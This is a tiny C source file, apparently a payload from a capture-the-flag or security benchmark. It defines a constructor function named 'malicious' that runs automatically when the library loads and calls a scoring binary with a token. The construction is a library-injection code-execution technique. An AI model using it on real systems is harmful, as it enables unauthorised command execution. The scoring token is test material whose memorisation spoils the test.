#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
  system("/usr/local/bin/score 037ff208-63aa-44ae-8f3d-77040aa59610");
}
